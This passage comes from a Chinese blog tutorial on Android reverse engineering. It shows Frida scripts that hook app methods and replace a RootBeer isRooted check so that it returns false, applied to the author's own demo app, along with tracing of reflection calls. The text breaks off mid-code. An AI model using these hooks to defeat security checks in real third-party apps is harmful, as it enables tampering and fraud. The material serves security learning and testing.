      "content_html": "<!-- summary -->\n<p>前面幾篇我們講的都是靜態分析的東西，也就是說我們並沒有把 app 跑起來，只是透過反編譯出來的程式碼研究 app 運作的邏輯，並且修改程式碼後重新打包執行。</p>\n<p>而動態分析指的就是我們會把 app 跑起來，並透過一些方式讓我們可以 hook 各種方法，去監視某些 method 的輸入以及輸出，甚至是竄改。</p>\n<p>這篇就讓我們來學習該怎麼樣使用 Frida 進行動態分析。</p>\n<!-- summary -->\n<p>系列文連結：</p>\n<ol>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-1/\">Android App 逆向入門之一：拆開與重組 apk</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-2/\">Android App 逆向入門之二：修改 smali 程式碼</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-3/\">Android App 逆向入門之三：監聽 app 封包</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-4/\">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li>\n</ol>\n<h2 id=\"%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9%EF%BC%9Afrida\"><a class=\"direct-link\" href=\"#%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9%EF%BC%9Afrida\">#</a> 工具介紹：Frida</h2>\n<p>這次要來使用的動態分析工具為 <a href=\"https://frida.re/\">Frida</a>，官網的介紹為：「Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.」，其實不只是 Android，其他平台也都可以使用 Frida 來做動態分析。</p>\n<p>有一套叫做 Objection 的工具是以 Frida 為基礎開發的，建議可以直接裝這個，因為會順便連 Frida 一起裝好，安裝教學可參考：<a href=\"https://github.com/sensepost/objection/wiki/Installation\">https://github.com/sensepost/objection/wiki/Installation</a></p>\n<p>雖然說 Frida 這種東西感覺就是要 root 才能使用，但其實它有兩種方法可以跑，一種確實需要 root，另外一種不需要 root</p>\n<p>需要 root 的要在手機上安裝 frida-server，詳情可參考官網：<a href=\"https://frida.re/docs/android/\">https://frida.re/docs/android/</a></p>\n<p>基本上就是丟個執行檔進去手機，然後用 root 的權限跑起來，檔案推進去要跑起來的時候如果不是預設 root，可以用 adb shell 進去改：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">adb shell<br><br><span class=\"token comment\"># 先刪掉舊的</span><br><span class=\"token function\">ps</span> -e <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> frida-server<br><span class=\"token function\">kill</span> -9 <span class=\"token punctuation\">{</span>your_process_id<span class=\"token punctuation\">}</span><br><br><span class=\"token comment\"># 確認用 root 跑</span><br><span class=\"token function\">su</span><br>/data/local/tmp/frida-server <span class=\"token operator\">&amp;</span></code></pre>\n<p>跑起來之後可以用 <code>frida-ps -U</code> 確認是否有跑起來</p>\n<p>第二種不需要 root 的方法要改 apk，原理是在 apk 裡面加一個 Frida 的 so 檔，並在入口點加一行 <code>System.loadLibrary()</code>，就可以使用 Frida，在 wiki 裡面有詳細說明：<a href=\"https://github.com/sensepost/objection/wiki/Patching-Android-Applications\">https://github.com/sensepost/objection/wiki/Patching-Android-Applications</a></p>\n<p>上面改 apk 的流程不需要自己執行，有現成的指令幫你做，如果打包不起來可以用這個指令：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">objection patchapk --source test.apk --skip-resources --ignore-nativelibs</code></pre>\n<p>如果還是不行，可以運用我們之前學到的知識自己動手改造，先用 <code>apktool d</code> 把包好的 apk 拆開，然後自己改裡面東西，例如說有時候會有 so 檔案 align 的問題，就可以把 <code>AndroidManifest.xml</code> 裡的 <code>android:extractNativeLibs</code> 改成 true，再包回去就好了。</p>\n<h2 id=\"frida-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8\"><a class=\"direct-link\" href=\"#frida-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8\">#</a> Frida 基本使用</h2>\n<p>先講一下 Frida 是做什麼的，最普遍的用途是寫一些程式碼來 hook function，hook 指的就是你可以自己覆蓋任何一個 function 的實作，就可以觀察輸入以及輸出，也可以改變函式的回傳值。</p>\n<p>而這些程式碼會用 JavaScript 來寫，並在啟動 app 時注入進去，以我自己的經驗來說，其實只要看多一點範例之後，就能滿快上手的。</p>\n<p>講這麼多，不如動手來做做看，這次用的範例 app 跟第一篇一樣，就是個按下按鈕以後會檢測是否有 root 的 app：<a href=\"https://github.com/aszx87410/demo/raw/master/android/demoapp.apk\">https://github.com/aszx87410/demo/raw/master/android/demoapp.apk</a></p>\n<p>這個 app 開啟之後預設的 activity 會是 <code>com.cymetrics.demo/MainActivity</code>，我們先來 hook 這個 class 的 onCreate 方法看看。</p>\n<p>我們先新建一個檔案 <code>script.js</code>，內容為：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> MainActivity <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'com.cymetrics.demo.MainActivity'</span><span class=\"token punctuation\">)</span><br>    MainActivity<span class=\"token punctuation\">.</span>onCreate<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'MainActivity onCreate'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">setImmediate</span><span class=\"token punctuation\">(</span>run<span class=\"token punctuation\">)</span></code></pre>\n<p>接著下指令：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">frida -U --no-pause -l script.js -f <span class=\"token string\">\"com.cymetrics.demo\"</span></code></pre>\n<p>如果你沒有 root 的話，啟動方式會不太一樣，先照上面說的 patch app，接著在手機上安裝，然後在 terminal 輸入：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">frida -U Gadget -l script.js</code></pre>\n<p>接著你應該會看到你的 terminal 上面多了一行 log，內容就是 <code>MainActivity onCreate</code>，而手機上出現 app crash 的訊息，這是正常的。</p>\n<p>先來簡單講一下 Frida 腳本的基本結構，起手式就是：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// 程式碼放這邊</span><br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">setImmediate</span><span class=\"token punctuation\">(</span>run<span class=\"token punctuation\">)</span></code></pre>\n<p>接著就看你想要 hook 什麼樣的方法，以我們剛剛的程式碼來說，先用 <code>Java.use</code> 拿到想要 hook 的 class，再用 <code>MainActivity.onCreate.implementation</code> 把原本的實作換成我們自己定義的 function。</p>\n<p>那為什麼 hook 之後 app 就掛掉了呢？因為我們自己實作的 function 除了 log 以外什麼都沒做，也就是說原本的 onCreate 該做的事情都被拿掉了，所以 crash 也是合情合理，想知道 crash 的根本原因可以 <code>adb logcat | grep AndroidRuntime</code> 一下：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">android.util.SuperNotCalledException: Activity <span class=\"token punctuation\">{</span>com.cymetrics.demo/com.cymetrics.demo.MainActivity<span class=\"token punctuation\">}</span> did not call through to super.onCreate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<p>那我們應該怎麼做呢？只要記得在最後面呼叫原本的實作即可，這樣寫：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> MainActivity <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'com.cymetrics.demo.MainActivity'</span><span class=\"token punctuation\">)</span><br>    MainActivity<span class=\"token punctuation\">.</span>onCreate<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'MainActivity onCreate'</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">setImmediate</span><span class=\"token punctuation\">(</span>run<span class=\"token punctuation\">)</span></code></pre>\n<p><code>this</code> 會是原本的 MainActivity，透過 <code>this.onCreate.call</code> 可以呼叫到原本的實作，而 call 這個方法第一個要傳入的參數就是 this，後面傳入參數。</p>\n<p>執行上面腳本之後，會出現另外一個錯誤：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">Error: onCreate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>: argument types <span class=\"token keyword\">do</span> not match any of:<br>  .overload<span class=\"token punctuation\">(</span><span class=\"token string\">'android.os.Bundle'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>這是因為 onCreate 其實應該是有帶參數的，只是我們覆蓋的時候沒有接收參數，因此就出錯了。為了避免這個問題，我會建議在覆蓋實作的時候在前面加上 <code>.overload()</code>，像這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\">MainActivity<span class=\"token punctuation\">.</span>onCreate<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Frida 就會再次出現錯誤訊息提示你正確的參數應該是什麼，就可以照著做，最後會像這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> MainActivity <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'com.cymetrics.demo.MainActivity'</span><span class=\"token punctuation\">)</span><br>    MainActivity<span class=\"token punctuation\">.</span>onCreate<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">'android.os.Bundle'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">a</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'MainActivity onCreate'</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">setImmediate</span><span class=\"token punctuation\">(</span>run<span class=\"token punctuation\">)</span></code></pre>\n<p>如此一來，就能知道參數是什麼，在呼叫原本的實作時也能帶入參數，就不會出錯了。</p>\n<p>既然都可以插入程式碼了，我們可以做一大堆事情，像是直接在 UI 上面顯示一個新的訊息：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> MainActivity <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'com.cymetrics.demo.MainActivity'</span><span class=\"token punctuation\">)</span><br>    MainActivity<span class=\"token punctuation\">.</span>onCreate<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">'android.os.Bundle'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">a</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'MainActivity onCreate'</span><span class=\"token punctuation\">)</span><br>      <span class=\"token comment\">// Toast 一定要跑在 main thread(UI thread)</span><br>      Java<span class=\"token punctuation\">.</span><span class=\"token function\">scheduleOnMainThread</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">var</span> Toast <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"android.widget.Toast\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">var</span> currentApplication <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'android.app.ActivityThread'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">currentApplication</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token comment\">// Toast 的第一個參數需要 context 才能執行</span><br>        <span class=\"token keyword\">var</span> context <span class=\"token operator\">=</span> currentApplication<span class=\"token punctuation\">.</span><span class=\"token function\">getApplicationContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        Toast<span class=\"token punctuation\">.</span><span class=\"token function\">makeText</span><span class=\"token punctuation\">(</span><br>          context<span class=\"token punctuation\">,</span><br>          <span class=\"token comment\">// 這個參數的型態要正確，直接傳字串會出錯</span><br>          Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>$<span class=\"token keyword\">new</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>          Toast<span class=\"token punctuation\">.</span><span class=\"token constant\">LENGTH_SHORT</span><span class=\"token punctuation\">.</span>value<br>        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">setImmediate</span><span class=\"token punctuation\">(</span>run<span class=\"token punctuation\">)</span></code></pre>\n<p>程式碼來自：<a href=\"https://gist.github.com/myzhan/ab13068463cd7f77b7f06ae561ea853a\">makeToast.js</a>。</p>\n<h2 id=\"%E4%BD%BF%E7%94%A8-frida-%E7%B9%9E%E9%81%8E-root-%E6%AA%A2%E6%B8%AC\"><a class=\"direct-link\" href=\"#%E4%BD%BF%E7%94%A8-frida-%E7%B9%9E%E9%81%8E-root-%E6%AA%A2%E6%B8%AC\">#</a> 使用 Frida 繞過 root 檢測</h2>\n<p>我們在之前的文章中繞過 root 檢測時，是直接去改 smali 的程式碼，直接把檢測的 function 給 patch 掉，藉此來繞過。有了 Frida 以後，就不需要去改 smali 的程式碼了，可以直接 hook 檢測的 function 並且把實作替換掉即可，像是這樣：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  Java<span class=\"token punctuation\">.</span><span class=\"token function\">perform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> RootBeer <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'com.scottyab.rootbeer.RootBeer'</span><span class=\"token punctuation\">)</span>    <br>    RootBeer<span class=\"token punctuation\">.</span>isRooted<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bypass rootbeer'</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><br>  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token function\">setImmediate</span><span class=\"token punctuation\">(</span>run<span class=\"token punctuation\">)</span></code></pre>\n<p>沒錯，就是這麼容易。</p>\n<p>那你可能會問說，我們是怎麼知道要 hook 這個 function 的？這部分還是需要靠靜態分析，從靜態分析中我們得知是這個 function 在做檢測，所以用 Frida 來 hook 這個 function。</p>\n<p>我自己的話通常是兩個搭配使用，先反組譯之後靜態分析，稍微看一下程式碼，接著再用 Frida 去 hook，看能不能做到想做的事情，如果可以的話，我會再去改 smali 相對應的地方，然後把 app 重新打包，這樣就可以在沒有 Frida 的手機上也執行我想要的流程。</p>\n<p>其實 Frida 的基礎使用就是這樣了，剩下的就是靠著對於程式碼以及 Android 開發的理解，決定要 hook 哪一個 function。</p>\n<h2 id=\"%E5%85%B6%E4%BB%96-frida-%E5%B0%8F%E6%8A%80%E5%B7%A7\"><a class=\"direct-link\" href=\"#%E5%85%B6%E4%BB%96-frida-%E5%B0%8F%E6%8A%80%E5%B7%A7\">#</a> 其他 Frida 小技巧</h2>\n<p>底下列幾個我從網路上找到的 Frida 小技巧，都是實務上我有用到的，供大家參考。</p>\n<h3 id=\"%E5%8D%B0%E5%87%BA-stack-trace\"><a class=\"direct-link\" href=\"#%E5%8D%B0%E5%87%BA-stack-trace\">#</a> 印出 stack trace</h3>\n<p>假設某個 app 有檢查機制，會偵測是不是有 root，然後原始碼經過混淆所以比較難追蹤，但是在檢查時會用 Log.d 輸出檢查相關資訊，這時候我們可以 hook Log.d，並且利用 <code>Log.getStackTraceString</code> 輸出 stack trace，就能知道是在哪邊呼叫這個 function：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> Log <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"android.util.Log\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">var</span> Exception <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.Exception\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>Log<span class=\"token punctuation\">.</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">a<span class=\"token punctuation\">,</span> b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>   <span class=\"token comment\">// 發現輸出 root 偵測資訊的時候</span><br>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">'root'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// 印出 stack trace 方便追蹤</span><br>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Log<span class=\"token punctuation\">.</span><span class=\"token function\">getStackTraceString</span><span class=\"token punctuation\">(</span> Exception<span class=\"token punctuation\">.</span>$<span class=\"token keyword\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>   <span class=\"token punctuation\">}</span><br>   <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre>\n<h3 id=\"hook-reflect-%E7%9B%B8%E9%97%9C%E6%96%B9%E6%B3%95\"><a class=\"direct-link\" href=\"#hook-reflect-%E7%9B%B8%E9%97%9C%E6%96%B9%E6%B3%95\">#</a> hook Reflect 相關方法</h3>\n<p>在 Java 中除了直接呼叫方法以外，也可以透過反射（Reflect）的方式去呼叫，有些混淆的程式會大量運用這種技巧來加強靜態分析的難度，我們可以把每一個動態呼叫的方法都印出來，看看有沒有什麼蛛絲馬跡：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// hook Class.forName</span><br><span class=\"token keyword\">var</span> JavaClass <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'java.lang.Class'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>JavaClass<span class=\"token punctuation\">.</span>forName<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">'java.lang.String'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'boolean'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'java.lang.ClassLoader'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Class.forName'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><br>  <span class=\"token comment\">// 還可以印出特定 class 底下所有的方法</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cymetrics'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> TargetClass <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">var</span> methodsList <span class=\"token operator\">=</span> TargetClass<span class=\"token punctuation\">.</span>class<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethods</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> k<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k<span class=\"token operator\">&lt;</span>methodsList<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> k<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>methodsList<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span>  <br>  <span class=\"token punctuation\">}</span><br>  <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>forName<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">'java.lang.String'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'boolean'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'java.lang.ClassLoader'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token comment\">// hook Method.invoke，知道動態呼叫了哪些方法</span><br><span class=\"token keyword\">var</span> Method <span class=\"token operator\">=</span> Java<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token string\">'java.lang.reflect.Method'</span><span class=\"token punctuation\">)</span><br>Method<span class=\"token punctuation\">.</span>invoke<span class=\"token punctuation\">.</span><span class=\"token function\">overload</span><span class=\"token punctuation\">(</span><span class=\"token string\">'java.lang.Object'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'[Ljava.lang.Object;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">implementation</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">a<span class=\"token punctuation\">,</span>b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>  console<span class=\"token punctuation\">.</span><span 